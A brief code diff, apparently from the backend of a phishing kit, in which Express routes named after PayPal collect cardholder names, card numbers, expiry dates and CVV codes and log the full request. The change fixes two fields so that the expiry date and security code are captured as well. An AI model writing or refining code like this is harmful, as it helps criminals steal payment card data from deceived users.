@@ -55,8 +55,8 @@ app.post('/paypala', function (req, res) {
 app.post('/paypalb', function (req, res) {
     var a = req.body.cardHolder;
     var b = req.body.cardNumber;
-    var c = req.body.brand;
-    var d = req.body.brand;
+    var c = req.body.expDate;
+    var d = req.body.verificationCode;
 
 
     console.log(req.body);
